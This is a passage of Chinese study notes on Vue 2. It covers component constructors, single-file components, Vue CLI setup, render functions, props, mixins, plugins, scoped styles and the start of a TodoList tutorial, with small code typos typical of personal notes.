            }
        },
        template: `
            <div>
                <h2>{{name}}</h2>
            </div>
        `
    })

    const school = Vue.extend({
        data() {
            return {
                name: 'school'
            }
        },
        components: {
            student
        },
        template: `
            <div>
                <h2>{{name}}</h2>
                <student></student>
            </div>
        `
    })
    
    const app = Vue.extend({
        components: {
            school
        },
        template:`
            <school></school>
        `
    })
    
    const vm = new Vue({
        el: '#root',
        components: {
            app
        },
        template: `
            <app></app>
        `
    })


</script>
</body>
</html>

```

![image-20220526064037998](image-20220526064037998.png)

### 2.2.6.`VueComponent`构造函数

- `school`组件本质上是一个名为`VueComponent`的构造函数，且不是程序员定义的，是`Vue.extend`生成的

- 我们只需要写`<school></school>或者<school/>`，`Vue`解析时会帮我们创建`school`组件的实例对象，即`Vue`帮我们执行的`new VueComponent(options)`

- 特别注意：每次调用`Vue.extend`，返回的都是一个全新的`VueComponent`

- 关于`this`指向

  - 组件配置中
    - `data`函数、`methods`中的函数、`watch`中的函数、`computed`中的函数，它们的`this`指向均是**`VueComponent`**
  - `new Vue()`配置中
    - `data`函数、`methods`中的函数、`watch`中的函数、`computed`中的函数，它们的`this`指向均是**`Vue实例`**

- `VueComponent`的实例对象，以后简称`vc`，也可以称为组件实例对象；`Vue`的实例对象，以后简称`vm`

  - `vm`实例上有`$children`属性，值是每个`vc`实例

    ![image-20220526072955018](image-20220526072955018.png)

### 2.2.7.`Vue`实例与组件实例

注意区分`VUe`实例和组件实例的区别（之前讲过）

组件是可复用的实例

因为组件是可复用的实例，所以它们与`new Vue()`接收相同的选项，例如`data`、`computed`、`watch`、`methods`以及生命周期钩子等，仅有的例外是像`el`这样根实例特有的选项

组件配置项中的`data`必须是一个函数，因此每个实例可以维护一份被返回对象的独立拷贝



### 2.2.8.一个重要的内置关系

`VueComponent.prototype.__proto__ === Vue.prototype`

为什么要有这个关系：让组件实例对象（`vc`）可以访问到`Vue`原型上的属性、方法

![image-20220526144955027](image-20220526144955027.png)

```js
const d = function Demo()
```

`Demo.prototype === d.__proto__`

- 显示原型属性：`Demo.prototype`
- 隐式原型属性：`d.__proto__`

## 2.3.单文件组件

`*.vue`就是一个单文件组件，但浏览器肯定不能直接运行的

借助：`webpack`或`vue-cli`（搭建好的`webpack`的环境）

一般命名采取大写

`School.vue`

组件：实现局部（特定）功能效果的代码集合

为了符合上述描述，一个`.vue`文件应该包含`html/css/js`，分别对应`template/style/script`

```vue
<template>
	<!-- 组件的结构 -->
</template>

<script>
	// 组件交互相关的代码（数据、方法等）
</script>

<style>
	/* 组件的样式 */
</style>
```



```vue
<template>
	<!-- 组件的结构 -->
	<div class="demo">
		<h2>
        	名称：{{name}}    
    	</h2>
    </div>
</template>

<script>
	// 组件交互相关的代码（数据、方法等）
    const school = Vue.extend({
        data() {
            return {
                name: 'sai'
            }
        }
    })
</script>

<style>
	/* 组件的样式 */
    .demo{
        background-color: orange;
    }
</style>
```

注意：`script`的`js`部分要用模块化的写法，一般来说采取默认暴露的写法，引入的时候比较方便

```vue
<script>
	// 组件交互相关的代码（数据、方法等）
    const school = Vue.extend({
        data() {
            return {
                name: 'sai'
            }
        }
    })
    export default school

</script>
```

简写变量：

```vue
<script>
	// 组件交互相关的代码（数据、方法等）
    
    export default Vue.extend({
        data() {
            return {
                name: 'sai'
            }
        }
    })
</script>
```

省略`extend`方法

```vue
<script>
	// 组件交互相关的代码（数据、方法等）
    export default {
        data() {
            return {
                name: 'sai'
            }
        }
    }
</script>
```

完整写法：

`School.vue`

```vue
<template>
	<!-- 组件的结构 -->
	<div class="demo">
		<h2>
        	名称：{{name}}    
    	</h2>
    </div>
</template>

<script>
    export default {
        name: 'School', // 一般定义name属性，和文件名一致
        data() {
            return {
                name: 'sai'
            }
        }
    }
</script>

<style>
	/* 组件的样式 */
    .demo{
        background-color: orange;
    }
</style>
```

创建`Student`和`App`组件

在`App`组件中引入组件

`App.vue`

```vue
<template>
	<div>
		<School/>
        <Student/>
    </div>
</template>

<script>
    // 引入组件
    import School from './School' // 如果是在脚手架中，可以省略后缀
    import Student from './Student'
    
    export default {
        name: 'App',
        components: {
            School,
            Student
        }
    }
</script>

<style>
</style>
```

所有的组件都是受`vm`管理的，此时我们应该怎么创建`vm`呢？

可以新建一个`main.js`入口文件

`main.js`

```js
import App from './App'

new Vue({
    el: "#root",
    components:{
        App
    },
    template: '<App/>'
})
```

还有一个问题，现在没有容器，我们还需要创建`index.html`

`index.html`

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
	<div id="root">
    </div>
    <script src="./js/vue.js"></script>
    <script src="./main.js"></script>
</body>
</html>
```

整体形式如上，但不能在浏览器上运行

在脚手架环境中可以直接运行

# 3.使用`Vue`脚手架

## 3.1.说明

- `Vue`脚手架是`Vue`官方提供的标准化开发工具：[介绍 | Vue CLI (vuejs.org)](https://cli.vuejs.org/zh/guide/)
- 脚手架开发工具的版本，一般选择最新的即可，是向下兼容的
  - 不要选择新的技术版本，却选择了旧的开发工具版本

## 3.2.具体步骤

如何创建`Vue`项目

- 安装`nodejs`
- 创建新目录并进入，习惯性的`npm init -y`一下，创建一个空的`package.json`
  - 安装`vue-cli`：`npm i @vue/cli`
  - `20220511`默认安装的脚手架版本为`5.0.4`
  - 这个默认是安装在本地的，调用指令时需要使用`npx`前缀，如果是全局安装的则不需要
- 创建`vue`项目：`npx vue create project-name`或`vue create project-name`
  - 然后选择是`vue2`还是`vue3`的项目
  - 根据提示启动项目：`npm run serve`
- 备注：
  - 如果出现下载慢，可以配置淘宝镜像：`npm config set registry https://registry.npm.taobao.org`
    - 现在已经重定向到`https://registry.npmmirror.com/`了
  - `Vue`脚手架隐藏了所有`webpack`相关的配置，若想查看具体的`webpack`配置，可以执行：`vue inspect > output.js`

## 3.3.脚手架目录结构

![image-20220526154714988](image-20220526154714988.png)

主要目录：`src`

![image-20220526155027939](image-20220526155027939.png)

入口文件：`main.js`

```js
import Vue from 'vue' // 引入Vue
import App from './App.vue' // 引入附属组件

Vue.config.productionTip = false // 关闭生产提示

// 创建实例对象vm
new Vue({
  render: h => h(App), // render函数作用：将App组件放入容器中
}).$mount('#app') // 获取容器

```

`assets`一般放静态资源

那么依赖的那个`html`文件在那儿呢？在`public`目录下

![image-20220526160049268](image-20220526160049268.png)

`index.html`

- `BASE_URL`：正式打包到服务器后，`BASE_URL`指向的是`public`所在的路径
- `title`：引用了`webpack`插件里的配置作为标题
- `noscript`：浏览器不支持`js`时，将会提示
- 容器：`<div id="app"></div>`

```html
<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <link rel="icon" href="<%= BASE_URL %>favicon.ico">
    <title><%= htmlWebpackPlugin.options.title %></title>
  </head>
  <body>
    <noscript>
      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
    <div id="app"></div>
    <!-- built files will be auto injected -->
  </body>
</html>

```

## 3.4.`render`函数

我们把`render`函数那部分注释掉，会提示我们用的`vue`是运行版本，这个版本是没有模板解析器的，所以要用`render`函数来解析模板。而之前本地引用的`vue.js`是有模板解析器的

我们在入口文件引入的`vue`是残缺的：`import Vue from 'vue'`

- 将模板交给`render`
- 引入完整版本的`vue`

我们在引入第三方库的时候，只写了名字，现在要找到具体位置，确认引入的究竟是哪一个`js`文件

`import Vue from 'vue'`实际上只引入`node_modules/vue/`这个文件夹：

![image-20220526162049999](image-20220526162049999.png)

我们看一下`package.json`：

```json
  "main": "dist/vue.runtime.common.js",
  "module": "dist/vue.runtime.esm.js",
```

其中的`module`字段表示，如果通过`es6`模块化的语法引入，则实际引入的文件是`dist/vue.runtime.esm.js`，可以在该文件中新增打印语句确认一下：

![image-20220526162240712](image-20220526162240712.png)

这个`vue`就是残缺版的`vue`，少了模板解析器，则`template`配置项就没人解析了

我们可以试试第二种方式，引入`import Vue from 'vue/dist/vue'`，模板正常解析，页面出来了

但是，为什么要引入残缺版的`vue`呢？



我们先改写一下`render`配置项：

```js
new Vue({
    render(creatElement) { // 要有返回值
        console.log('render', typeof creatElement) // function
        return createElement('h1', '你好啊') // 手写源码后就没啥问题了
    }
}).$mount('#app')
```

简写：

```js
new Vue({
    render: h => h('h1', '你好啊') // h是参数createElement
    }
}).$mount('#app')
```

组件写法：

```js
new Vue({
    render: h => h(App)
    }
}).$mount('#app')
```



回到刚刚的问题，为啥要引入没有模板解析器的残缺版的`vue`呢？

因为模板解析器的代码体积，占据了整个`vue`的`2/3`的体积

并且打包后的文件会包含模板解析器，此时是不需要的



还有个细节的问题：

- `render`函数解析的是`template`配置项里的模板
- `.vue`文件里的`template`并不是`render`函数解析的
  - 用的`vue-template-compiler`这个`loader`解析的
- 如果就像在浏览器上，运行残缺版的`vue`，可以引入`vue.runtime.js`



小结：

关于不同版本的`vue`

- `vue.js`与`vue.runtime.xxx.js`的区别
  - `vue.js`是完整版的`Vue`，包含核心功能和模板解析器
  - `vue.runtime.xxx.js`是运行版的`Vue`，只包含：核心功能，没有模板解析器
- 因为`vue.runtime.xxx.js`没有模板解析器，所以不能使用`template`配置项，需要使用`render`函数，接收到`createElement`函数去指定具体内容

## 3.5.修改默认配置

`Vue`脚手架隐藏了所有`webpack`相关的配置，若想查看具体的`webpack`配置，可以执行：`vue inspect > output.js`

如果要修改默认配置，需要借助`vue.config.js`配置文件

[配置参考 | Vue CLI (vuejs.org)](https://cli.vuejs.org/zh/config/)

`vue.config.js` 是一个可选的配置文件，如果项目的 (和 `package.json` 同级的) 根目录中存在这个文件，那么它会被 `@vue/cli-service` 自动加载。你也可以使用 `package.json` 中的 `vue` 字段，但是注意这种写法需要你严格遵照 JSON 的格式来写。

这个文件应该导出一个包含了选项的对象：

```js
// vue.config.js

/**
 * @type {import('@vue/cli-service').ProjectOptions}
 */
module.exports = {
  // 选项...
}
```

或者，你也可以使用 `@vue/cli-service` 提供的 `defineConfig` 帮手函数，以获得更好的类型提示：

```js
// vue.config.js
const { defineConfig } = require('@vue/cli-service')

module.exports = defineConfig({
  // 选项
})
```

有一定`webpack`基础再看官网的这些配置项说明，是没啥问题的

- 修改入口文件：`pages`

  ```js
  module.exports = {
    pages: {
      index: {
        // page 的入口
        entry: 'src/index/main.js',
        // 模板来源
        template: 'public/index.html',
        // 在 dist/index.html 的输出
        filename: 'index.html',
        // 当使用 title 选项时，
        // template 中的 title 标签需要是 <title><%= htmlWebpackPlugin.options.title %></title>
        title: 'Index Page',
        // 在这个页面中包含的块，默认情况下会包含
        // 提取出来的通用 chunk 和 vendor chunk。
        chunks: ['chunk-vendors', 'chunk-common', 'index']
      },
      // 当使用只有入口的字符串格式时，
      // 模板会被推导为 `public/subpage.html`
      // 并且如果找不到的话，就回退到 `public/index.html`。
      // 输出文件名会被推导为 `subpage.html`。
      subpage: 'src/subpage/main.js'
    }
  }
  ```

- 关闭语法检查：`lintOnSave`

  ```js
  // vue.config.js
  module.exports = {
    lintOnSave: false
  }
  ```

## 3.6.`ref`属性

在`vue`中如果想要获取`dom`，使用`ref`属性

```html
<div ref="title">
    Hello
</div>
```

组件实例上，有一个`$refs`属性，收集了含有`ref`属性的结构

使用：

```js
console.log(this.$refs.title)
```

如果给组件标签添加了`ref`属性，取到的则是组件的实例对象，可以用作组件间的通信

```html
<School ref="school"></School>
```

而如果是给的`id`，取到的则是渲染后的`dom`结构

```html
<School id="school"></School>
```



小结：`ref`属性

- 被用来给元素或子组件注册引用信息（替代`id`）
- 应用在`html`标签上，获取的是真实`dom`，应用在组件标签上获取的是组件实例对象（`vc`）
- 使用方式
  - 打标识：`<h1 ref="xxx">...</h1>`或`<School ref="xxx"></School>`
  - 获取：`this.$refs.xxx`

## 3.7.`props`配置

`props`：给子组件传递数据

写法：

- 使用组件标签的同时，自定义属性：`<School name="sai"></School>`

  - 相当于往组件上传值

- 组件内容要有一个配置项，接收传过来的值（数组写法）

  ```js
  props: [
      'name'
  ]
  ```

- 子组件中定义`data`，并接收`props`传值：

  ```js
  props: [
      'name'
  ],
  data() {
      return {
          age: 18
      }
  }
  ```

  最终组件实例对象上，`name`和`age`属性是都有的，说明通过`props`的确拿到了传入的值并挂载在了组件实例对象上

  但组件实例的`_data`上只有`age`属性

  ![image-20220526191130632](image-20220526191130632.png)

- 传值的类型

  - 传字符串：`<School name="sai"></School>`
  - 传表达式的结果：`<School :age="18+1"></School>`
    - 最终传的值是`19`

- `props`使用对象写法，对类型进行限制

  ```js
    props: {
      name: String,
      age: Number
    }
  ```

- `props`限制必须传值、设置默认值，一般这两个配置项不会同时出现

  ```js
    props: {
      name: {
      	type: String,
          required: true, // 限制为必须传值
      },
      age: {
      	type: Number,
          default: 18
      },
    }
  ```

- 注意点

  - 不要传递类似`key`等关键字

  - 使用`props`声明时，不要多声明，传啥就声明啥

  - `props`从外部接收到的值，是不允许修改的，如果直接修改会报错

    ![image-20220526192908549](image-20220526192908549.png)

    - 最终`props`和`data`中的配置项，都会被挂载在组件实例对象上

    - `props`的优先级比`data`高，可以在`data`中定义新的变量，值为`props`的先接收到变量

    - 模板使用`data`中的数据，如果需要修改数据，修改`data`配置项的数据，是没有问题的

      ```vue
      <template>
        <div>
          <h2>{{name}} - {{myAge}}</h2>
          <button @click="modifyAge">click</button>
        </div>
      </template>
      
      <script>
      export default {
        name: 'School',
        data() {
          return {
            myAge: this.age
          }
        },
        props: {
          name: String,
          age: Number
        },
        mounted() {
          console.log(this)
        },
        methods: {
          modifyAge() {
            this.myAge++ //修改data的配置项
          }
        }
      }
      </script>
      
      <style>
      </style>
      
      ```

小结：

- 功能：让组件接收外部传递进来的数据

  - 传递数据：`<Demo name="xxx"/>`

  - 接收数据：

    - 第一种方式（只接收）：`props: ['name']`

    - 第二种方式（限制类型）：

      ```js
      props: {
          name: Number
      }
      ```

    - 第三种方式（限制类型、限制必要性、指定默认值）

      ```js
      props: {
          name: {
              type: String, // 类型
              required: true, // 必要性
              default: 'sai' // 默认值
          }
      }
      ```

  - 备注：`props`  是只读的，`Vue`底层会监视你对`props`的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制`props`的内容到`data`中一份，然后去修改`data`中的数据
  
  - 父传子，可以传`data`和`method`
  
    - `data`
    - `method`，子组件调用传过来方法时，如果传入了参数，父组件也是可以收到的

当有`props`配置项时，`data`配置项里的值获取不到

```vue
export default {
  name: "PageCard",
  props: {
    iconfontL: {
      type: String,
    },
    iconfontR: {
      type: String
    },
    name: {
      type: String,
      required: true,
    },
    showloading: {
      type: Boolean,
      default: true,
    },
    height: {
      type: Number | String,
    }
  },
  data() {
    return {
      display: 'none',
      styleContextHeight: {
        height: this.height + 'px'
      },
      styleContextShow: {
        display: this.display
      }
    }
  }
};
</script>
```

![image-20221207101544611](image-20221207101544611.png)

怀疑是因为把data配置项写在了`props`配置项下面，把`data`配置项在上面，`props`配置项在下面，还是不行

试了下写在内联样式里，没抽取出来

```vue
    <!-- <div class="content" :style="[styleContextHeight, styleContextShow]"> -->
    <div
      class="content"
      :style="{ height: this.height + 'px', display: this.dataDisplay }"
    >
```

只要数据更新，模板就会触发渲染，这样是肯定可以的

写成数组对象不行的原因，可能和Vue整个的流程有关



其他拓展

- vue中props传值给data时-props有值但data却是空的问题
  - https://www.codeleading.com/article/39372486645/

- 解决vue组件props传值,对象获取不到的问题
  - https://blog.csdn.net/pink_cz/article/details/126328341

## 3.8.`mixin`配置

### 3.8.1.`mixin`基本使用

两个组件共享一个配置时，可以放在`mixin.js`中

```js
export const mixin1 = {
    methods: {
        showName() {
            alert(this.name)
        }
    }
}

//可以配置多个混合
```

借助`mixins`配置项，可以在多个组件中使用

```vue
<template>
    <div>
        <h2>{{name}}</h2>
        <button @click="showName">click</button>
    </div>
</template>

<script>
    import {mixin1} from '../mixin/mixin'
    export default {
        name: 'MySchool',
        data() {
            return {
                name: 'sai'
            }
        },
        mixins: [ //使用混合
            mixin1
        ]
    }
</script>

<style scoped>

</style>
```

### 3.8.2.定义多个混合

定义多个混合

```js
export const mixin1 = {
    methods: {
        showName() {
            alert(this.name)
        }
    }
}

export const mixin2 = {
    data() {
        return {
            x: 1,
            y: 2
        }
    }
}
```

使用多个混合

```vue
<template>
    <div>
        <h2>{{name}}</h2>
        <button @click="showName">click</button>
        <h2>{{x}} - {{y}}</h2>
    </div>
</template>

<script>
    import {mixin1 ,mixin2} from '../mixin/mixin'
    export default {
        name: 'MySchool',
        data() {
            return {
                name: 'sai'
            }
        },
        mixins: [
            mixin1,
            mixin2
        ],
        mounted() {
            console.log(this.x)
        }
    }
</script>

<style scoped>

</style>
```

组件中的`data`多了`mixin`中定义的数据

![image-20220527065551713](image-20220527065551713.png)

如果`mixin`中和组件的`data`中，含有相同的数据变量，以组件的优先，`methods`配置项也是

但是，生命周期钩子，不以任何人为主，都会执行

```js
export const mixin1 = {
    methods: {
        showName() {
            alert(this.name)
        }
    },
    mounted() {
        console.log('mixin1 mounted') // 混合中的钩子会先执行，并按照引入先后依此执行
    }
}

export const mixin2 = {
    data() {
        return {
            x: 1,
            y: 2
        }
    },
    mounted() {
        console.log('mixin2 mounted')
    }
}
```



```vue
<template>
    <div>
        <h2>{{name}}</h2>
        <button @click="showName">click</button>
        <h2>{{x}} - {{y}}</h2>
    </div>
</template>

<script>
    import {mixin1 ,mixin2} from '../mixin/mixin'
    export default {
        name: 'MySchool',
        data() {
            return {
                name: 'sai',
                x: 666
            }
        },
        mixins: [
            mixin1,
            mixin2
        ],
        mounted() {
            console.log('School mounted') // 组件中的生命周期钩子会后执行
        }
    }
</script>

<style scoped>

</style>
```



![image-20220527070626058](image-20220527070626058.png)

### 3.8.3.全局混入

利用`Vue.mixin(options)`方法，在`main.js`中引入，作为全局混入，使用时所有的组件中都可以使用

```js
import Vue from 'vue'
import {mixin1, mixin2} from './mixin/mixin'

Vue.mixin(mixin1)
Vue.mixin(mixin2)
```

备注：如果`main.js`用`createApp`方法替代`new Vue`的操作了，上面的写法会提示`Vue`不存在，写法如下：

```js
// 暂时不用管（或者可自行查阅资料）
```



全局混入后，`vm`根实例和所有的组件实例对象，都有`mixin`中配置的`data`配置项或其他配置项

![image-20220527135656752](image-20220527135656752.png)

### 3.8.4.小结：`mixin`

`mixin`混入

- 功能：可以把多个组件共有的配置提取成一个混入对象

- 使用方式

  - 第一步，定义混合

    ```js
    {
        data() {},
        methods: {},
        ......
    }
    ```

  - 第二步，使用混合

    - 局部混入：

      ```js
      import {xxx} from './mixin'
      
      ...
      // 配置项
      mixins: [xxx]
      ```

    - 全局混入：

      ```js
      import Vue from 'vue'
      import {xxx} from './mixin'
      
      Vue.mixin(xxx)
      ```

## 3.9.插件

插件本质是一个对象，但是这个对象要包含`install`方法

新建`plugins.js`定义并暴露该对象

```js
export default {
	install() {
		console.log('install')
	}
}
```

`main.js`中引入插件，并使用`Vue`提供的`use`方法，使用定义好的插件

```js
import plugins from './plugins'
Vue.use(plugins) //使用插件，此时vue会帮我们调用install方法
```

那有啥用咧

`install`方法被调用时，可以接受一个参数，这个参数是`vm`的构造函数`Vue`

```js
export default {
	install(Vue) {
		console.log('install', Vue)
	}
}
```

![image-20220527141319725](image-20220527141319725.png)

结合我们之前讲过的`Vue`身上的方法，能做很多事情

```js
export default {
	install(Vue) {
        // 定义全局过滤器
		Vue.filter()
        
        // 定义全局自定义指令
        Vue.directive()
        
        // 定义全局混入
        Vue.mixin()
        
        // 往原型上添加方法，`vm`和`vc`就都可以使用
        Vue.prototype.
	}
}
```

小结：插件

- 功能：用于增强`Vue`

- 本质：包含一个`install`方法的对象

  - `install`方法的第一个参数是`Vue`，第二个及以后的参数是插件使用者传递的数据

- 定义插件：

  ```js
  exports default = {
  	install(Vue, options) {
  		Vue.filter(...) // 定义全局过滤器
          Vue.directive(...) // 定义全局自定义指令
          Vue.mixin(...) // 定义全局混入
          Vue.prototype.$myMethod = function(){...} // 添加实例方法和属性，`vm`和`vc`就都可以使用
          Vue.prototype.$myProperty = xxx
      }
  }
  ```

- 使用插件

  ```js
  import plugins from './plugins'
  Vue.use(plugins) // 使用者可以添加参数
  ```

## 3.10.`scoped`样式

如果`style`标签中，没有`scoped`属性，最终所有的样式会汇总到一起，容易出现类名冲突，后引入的组件中的样式会覆盖先引入的样式。

可以给`style`添加使用`scoped`属性，解决样式冲突的问题

- 原理：有了`scoped`属性后，`vue`会给匹配到类名的`dom`节点添加自定义属性：`data-v-xxx`，然后使用`css`的属性标签选择器来匹配样式

  ```css
  .demo[data-v-123] {
      background-color: 'blue'
  }
  .demo[data-v-456] {
      background-color: 'yellow'
  }
  ```

- `App`组件一般不加

- 也可以使用`css`预编译语言来编写样式，但是要先安装`less-loader`

  ```css
  <style lang="less">
  
  </style>
  ```

  问题：可能会出现版本不兼容的问题

  - 此时自己下载的`vue-cli`，用到`webpack`的版本为`5`版本（`node_modules`文件夹找`webapck`文件夹，查看`package.json`文件），这个时候装`less-loader`是没有问题的，因为默认安装的是最新版的`less-loader`，新版本是为了迎合`webpakc5`
  - 如果`vue-cli`用的`webpack`为`4`版本，则要`less-loader`版本降级以兼容`webpack4`
    - 查看所有版本：`npm view less-loader versions`
    - 试一下不那么新的版本：`npm i less-loader@7.0.0 -D` 
      - `8`及以上的版本就是为`webpack4`服务的了



小结：`scoped`样式

- 作用：让样式在局部生效，防止冲突
- 写法：`<style scoped>`

## 3.11.组件化编码流程

- 实现静态组件：抽取组件，使用组件实现静态效果

  - 一般需要自己写静态页面
  - 也有可能，静态页面别人已经写好了，然后拿过来自己拆成组件
  - 一般组件名，最好是多个单词

- 展示动态数据

  - 确定数据保存在哪个组件

  - 数据的类型、名称是什么

- 交互

  - 组件之间的数据传递前的预定义
    - 父传子，可以传`data`和`method`
      - `data`
      - `method`，子组件调用传过来方法时，如果传入了参数，父组件也是可以收到的

  - 绑定事件监听，并进行业务交互逻辑编写，并对异常情况进行处理
  
    


### 3.11.1`ToDOList`案例

#### 3.11.1.1.编写静态组件

##### `App.vue`

```vue
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHeader></MyHeader>
        <MyList></MyList>
        <MyFooter></MyFooter>
      </div>
    </div>
  </div>
</template>

<script>
    import MyHeader from './components/MyHeader.vue'
    import MyList from './components/MyList.vue'
    import MyFooter from './components/MyFooter.vue'

    export default {
        name: 'App',
        components: {
            MyHeader,
            MyList,
            MyFooter
        }
    }
</script>

<style lang="less">
  #root {
    @color-white: white;
    @color-danger: #bd362f;
    @color-grey-d: #ddd;
    @display: display;
    @selector: .btn;

    background-color: @color-white;

    .todo-container {
      width: 600px;
      margin: 0 auto;

      .todo-wrap {
        padding: 10px;
        border: 1px solid @color-grey-d;
        border-radius: 5px;
      }
    }

    @{selector} {
        @{display}: inline-block;

      padding: 4px 12px;
      margin-bottom: 0;
      font-size: 14px;
      line-height: 20px;
      text-align: center;
      vertical-align: middle;
      cursor: pointer;
      box-shadow: inset 0 1px rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
      border-radius: 4px;

      &:focus {
        outline: none;
      }
    }

    .btn-danger {
      color: @color-white;
      background-color: @color-danger;

      &:hover {
        color: @color-white;
        background-color: @color-danger;
      }
    }
  }


</style>

```

##### `MyHeader.vue`

```vue
<template>
  <div class="todo-header">
    <input type="text" placeholder="请输入任务名称，回车键确认">
  </div>
</template>

<script>
    export default {
        name: "MyHeader"
    }
</script>

<style scoped lang="less">
  .todo-header {
    @color-grey-c: #ccc;
    @color-blue: rgba(82, 168, 236, 0.8);

    input {
      width: 560px;
      height: 28px;
      border: 1px solid @color-grey-c;
      border-radius: 4px;
      padding: 4px 7px;
      font-size: 14px;

      &:focus {
        outline: none;
        border-color: @color-blue;
        box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px @color-blue;
      }
    }
  }
</style>
```

##### `MyList.vue`

```vue
<template>
  <ul class="todo-main">
    <MyItem></MyItem>
    <MyItem></MyItem>
    <MyItem></MyItem>
  </ul>
</template>

<script>
    import MyItem from './MyItem.vue'

    export default {
        name: "MyList",
        components: {
            MyItem
        }
    }
</script>

<style scoped lang="less">
  @color-grey-d: #ddd;

  .todo-main {
    margin-left: 0;
    border: 1px solid @color-grey-d;
    padding: 0;
  }

  .todo-empty {
    height: 40px;
    line-height: 40px;
    border: 1px solid @color-grey-d;
    border-radius: 2px;
    padding-left: 5px;
    margin-top: 10px;
  }

</style>
```

##### `MyItem.vue`

```vue
<template>
  <li>
    <label>
      <input type="checkbox">
      <span>xxx</span>
    </label>
    <button class="btn btn-danger" style="display: none">删除</button>
  </li>
</template>

<script>
    export default {
        name: "MyItem"
    }
</script>

<style scoped lang="less">
  li {
    @color-grey-d: #ddd;
    list-style: none;
    height: 36px;
    line-height: 36px;
    padding: 0 5px;
    border-bottom: 1px solid @color-grey-d;

    label {
      float: left;
      cursor: pointer;

      li input {
        vertical-align: middle;
        margin-right: 6px;
        position: relative;
        top: -1px;
      }
    }

    button {
      float: right;
      display: none;
      margin-top: 3px;
    }

    &:before {
      content: initial;
    }

    &:last-child {
      border-bottom: none;
    }

  }
</style>
```

##### `MyFooter.vue`

```vue
<template>
  <div class="todo-footer">
    <label>
      <input type="checkbox">
    </label>
    <span>
      <span>已完成0</span>/ 全部2
    </span>
    <button class="btn btn-danger">清空已完成任务</button>
  </div>
</template>

<script>
    export default {
        name: "MyFooter"
    }
</script>

<style scoped lang="less">
  .todo-footer {
    height: 40px;
    line-height: 40px;
    padding-left: 6px;
    margin-top: 5px;

    label {
      display: inline-block;
      margin-right: 20px;
      cursor: pointer;

      input {
        position: relative;
        top: -1px;
        vertical-align: middle;
        margin-right: 5px;
      }
    }

    button {
      float: right;
      margin-top: 5px;
    }
  }

</style>
```



#### 3.11.1.2.初始化列表

实际开发中，会封装`ajax`请求调用获取数据的接口，然后展示

`MyList.vue`

```vue
<template>
  <ul class="todo-main">
    <MyItem v-for="item in todos" :key="item.id" :todoObj="item"></MyItem>
  </ul>
</template>

<script>
    import MyItem from './MyItem.vue'

    export default {
        name: "MyList",
        components: {
            MyItem
        },
        data() {
            return {
                todos: [
                    {id:'001',title:'吃饭',done:true},
                    {id:'002',title:'睡觉',done:true},
                    {id:'003',title:'打豆豆',done:false},
                ]
            }
        }
    }
</script>
```

`MyItem.vue`

```vue
<template>
  <li>
    <label>
      <input type="checkbox" :checked="todoObj.done">
      <span>{{todoObj.title}}</span>
    </label>
    <button class="btn btn-danger" style="display: none">删除</button>
  </li>
</template>

<script>
    export default {
        name: "MyItem",
        props: {
            todoObj: {
                type: String
            }
        }
    }
</script>
```

![image-20220529204122256](image-20220529204122256.png)

#### 3.11.1.3.添加功能

该功能涉及到父组件给子组件传值，传递`method`

添加输入数据后，渲染时要生成唯一标识，可以使用`uuid`或`nanoid`库

`npm i nanoid -D`

`MyHeader.vue`

```vue
<template>
  <div class="todo-header">
    <input type="text" placeholder="请输入任务名称，回车键确认" @keyup.enter="addEvent" v-model="title">
  </div>
</template>

<script>
    import {nanoid} from 'nanoid'

    export default {
        name: "MyHeader",
        data() {
            return {
                title: '',
            }
        },
        props: {
            addTodo: {
                type: Function
            }
        },
        methods: {
            addEvent() {
                if(!this.title) return alert('输入不能为空')
                // 将用户的输入，包装成对象格式（和获取到的格式保持一致）
                const todoOjb = {
                    id: nanoid(),
                    title: this.title,
                    done: false
                }
                // 通知App组件去添加一个对象
                this.addTodo(todoOjb)
                this.title = ''
            }

        }
    }
</script>
```

现在要将`MyHeader`组件的数据传递给`MyList`组件，目前我们还没学到组件间通信

所以目前我们先把数据都放在`App`组件，然后通过`props`配置项传给`MyList`组件

并且，`APP`组件要获取到`Header`组件中输入的数据，可以先在`App`组件中，定义一个函数，通过`props`传递函数给`Header`，`Header`组件在调用函数并传参时，`App`组件也可以获取到这个参数

`App.vue`

```vue
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHeader :addTodo="addTodo"></MyHeader>
        <MyList :todos="todos"></MyList>
        <MyFooter></MyFooter>
      </div>
    </div>
  </div>
</template>

<script>
    import MyHeader from './components/MyHeader.vue'
    import MyList from './components/MyList.vue'
    import MyFooter from './components/MyFooter.vue'

    export default {
        name: 'App',
        components: {
            MyHeader,
            MyList,
            MyFooter
        },
        data() {
            return {
                todos: [
                    {id:'001',title:'吃饭',done:true},
                    {id:'002',title:'睡觉',done:true},
                    {id:'003',title:'打豆豆',done:false},
                ]
            }
        },
        methods: {
            addTodo(todoObj) {
                this.todos.push(todoObj)
            }
        }
    }
</script>

```

#### 3.11.1.4.勾选功能

该功能涉及到爷爷组件传值（父组件给儿子的儿子组件传值）

注意`MyItem`组件中，`:checked`是绑定的`props`的值，取消勾选需要修改`props`的值，但`vue`不建议修改，所以`input`不能写成`v-model`的形式

`input`输入框通过`change`事件，绑定`List`组件通过`props`传的函数，而该函数又是`App`组件通过`props`传递过来的

`App.vue`

```vue
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHeader :addTodo="addTodo"></MyHeader>
        <MyList :todos="todos" :checkTodo="checkTodo"></MyList>
        <MyFooter></MyFooter>
      </div>
    </div>
  </div>
</template>

<script>
    import MyHeader from './components/MyHeader.vue'
    import MyList from './components/MyList.vue'
    import MyFooter from './components/MyFooter.vue'

    export default {
        name: 'App',
        components: {
            MyHeader,
            MyList,
            MyFooter
        },
        data() {
            return {
                todos: [
                    {id:'001',title:'吃饭',done:true},
                    {id:'002',title:'睡觉',done:true},
                    {id:'003',title:'打豆豆',done:false},
                ]
            }
        },
        methods: {
            addTodo(todoObj) {
                this.todos.push(todoObj)
            },
            checkTodo(id) {
